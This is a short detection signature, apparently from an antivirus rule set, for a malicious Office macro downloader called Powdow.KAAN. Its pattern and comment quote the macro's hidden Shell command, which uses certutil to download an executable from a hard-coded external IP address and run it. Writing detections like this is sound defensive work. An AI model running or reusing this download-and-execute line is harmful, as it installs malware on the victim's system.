
rule TrojanDownloader_O97M_Powdow_KAAN_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.KAAN!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 2e 35 38 2e 31 34 39 2e 32 2f 6d 6f 6e 79 2e 65 78 65 22 22 20 4a 75 6a 76 70 71 61 67 77 75 65 7a 2e 65 78 65 2e 65 78 65 20 26 26 20 4a 75 6a 76 70 71 61 67 77 75 65 7a 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://2.58.149.2/mony.exe"" Jujvpqagwuez.exe.exe && Jujvpqagwuez.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}